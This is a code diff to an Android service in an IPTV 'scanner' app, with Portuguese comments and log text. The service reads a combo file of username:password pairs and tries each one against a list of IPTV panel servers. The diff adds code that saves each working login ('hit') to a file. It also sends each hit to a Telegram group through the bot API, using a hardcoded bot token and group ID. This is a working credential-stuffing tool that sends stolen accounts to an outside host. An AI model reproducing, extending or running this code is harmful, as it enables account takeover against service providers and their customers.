@@ -1,4 +1,4 @@
-package com.mundodosbots.scanner;
+package com.Scanner.IPTV;
 
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
@@ -13,10 +13,21 @@ import android.util.Log;
 import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
 
+import android.content.SharedPreferences;
+import android.net.Uri;
+import android.preference.PreferenceManager;
+import androidx.documentfile.provider.DocumentFile;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.FileReader;
 import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.ExecutorService;
@@ -35,7 +46,7 @@ public class ScanService extends Service {
     private ExecutorService executorService;
     private OkHttpClient httpClient;
 
-    private String panel;
+    private List<String> panels;
     private List<String> combos;
     private List<String> proxies;
     private int speed;
@@ -67,14 +78,13 @@ public class ScanService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (intent != null) {
-            panel = intent.getStringExtra("panel");
-            combos = intent.getStringArrayListExtra("combos");
-            proxies = intent.getStringArrayListExtra("proxies");
+            panels = intent.getStringArrayListExtra("panels");
+            String comboFileUriString = intent.getStringExtra("combo_file_uri");
             speed = intent.getIntExtra("speed", 10);
 
-            if (panel != null && combos != null && !combos.isEmpty()) {
+            if (panels != null && !panels.isEmpty() && comboFileUriString != null) {
                 startForeground(NOTIFICATION_ID, getNotification("Iniciando scan...", 0, 0));
-                startScan();
+                startScan(Uri.parse(comboFileUriString));
             } else {
                 stopSelf();
             }
@@ -82,33 +92,44 @@ public class ScanService extends Service {
         return START_NOT_STICKY;
     }
 
-    private void startScan() {
+    private void startScan(Uri comboFileUri) {
         isRunning = true;
         hitsCount.set(0);
         failsCount.set(0);
         currentIndex.set(0);
         executorService = Executors.newFixedThreadPool(speed);
 
-        for (int i = 0; i < combos.size(); i++) {
-            if (!isRunning) break;
-            final int comboIndex = i;
+        for (int i = 0; i < speed; i++) {
             executorService.submit(() -> {
-                if (!isRunning) return;
-                String combo = combos.get(comboIndex);
-                if (combo.contains(":")) {
-                    String[] parts = combo.split(":");
-                    String user = parts[0].trim();
-                    String pass = parts[1].trim();
-                    checkCombo(panel, user, pass);
-                }
-                currentIndex.incrementAndGet();
-                updateNotification();
-                if (currentIndex.get() == combos.size()) {
-                    stopScan();
+                try (InputStream inputStream = getContentResolver().openInputStream(comboFileUri);
+                     BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {
+                    String line;
+                    while (isRunning && (line = reader.readLine()) != null) {
+                        if (line.contains(":")) {
+                            String[] parts = line.split(":");
+                            String user = parts[0].trim();
+                            String pass = parts[1].trim();
+                            for (String panel : panels) {
+                                checkCombo(panel, user, pass);
+                            }
+                        }
+                        currentIndex.incrementAndGet();
+                        updateNotification();
+                    }
+                } catch (IOException e) {
+                    e.printStackTrace();
                 }
             });
         }
+
+        // Shutdown executor service when all tasks are submitted
         executorService.shutdown();
+        new Thread(() -> {
+            while (!executorService.isTerminated()) {
+                // Wait for all tasks to complete
+            }
+            stopScan();
+        }).start();
     }
 
     private void stopScan() {
@@ -151,11 +172,17 @@ public class ScanService extends Service {
                                 "Ilimitado";
                         String activeCons = userInfo.has("active_cons") ? userInfo.getString("active_cons") : "?";
 
-                        Hit hit = new Hit(user, pass, panel, expDate, activeCons);
+                        String port = "80";
+                        if (panel.contains(":")) {
+                            port = panel.split(":")[1];
+                        }
+                        Hit hit = new Hit(user, pass, panel, expDate, activeCons, port);
                         hitsCount.incrementAndGet();
                         if (listener != null) {
                             listener.onHitFound(hit);
                         }
+                        saveHitToFile(hit, panel);
+                        sendToTelegram(hit);
                     } else {
                         failsCount.incrementAndGet();
                     }
@@ -168,6 +195,53 @@ public class ScanService extends Service {
         } catch (IOException | JSONException e) {
             failsCount.incrementAndGet();
             Log.e("ScanService", "Erro ao verificar combo: " + e.getMessage());
+        }
+    }
+
+    private void sendToTelegram(Hit hit) {
+        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
+        boolean telegramEnabled = prefs.getBoolean("telegram_enabled", true);
+        if (!telegramEnabled) {
+            return;
+        }
+
+        String botToken = prefs.getString("telegram_bot_token", "8245169261:AAHTUygk3X99DtXysRwkPcjM7cYo0-FNpcQ");
+        String groupId = prefs.getString("telegram_group_id", "-1002710854837");
+        String message = hit.getFormattedText();
+
+        try {
+            String url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + groupId + "&text=" + java.net.URLEncoder.encode(message, "UTF-8");
+            Request request = new Request.Builder().url(url).build();
+            httpClient.newCall(request).execute();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void saveHitToFile(Hit hit, String panel) {
+        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
+        String directoryUriString = prefs.getString("hits_directory", null);
+        if (directoryUriString == null) {
+            return;
+        }
+
+        Uri directoryUri = Uri.parse(directoryUriString);
+        DocumentFile directory = DocumentFile.fromTreeUri(this, directoryUri);
+
+        if (directory != null && directory.exists() && directory.isDirectory()) {
+            String fileName = panel.replaceAll("[^a-zA-Z0-9.-]", "_") + ".txt";
+            DocumentFile file = directory.findFile(fileName);
+            if (file == null) {
+                file = directory.createFile("text/plain", fileName);
+            }
+
+            try (OutputStream os = getContentResolver().openOutputStream(file.getUri(), "wa")) {
+                if (os != null) {
+                    os.write((hit.getFormattedText() + "\n\n").getBytes());
+                }
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
         }
     }
 
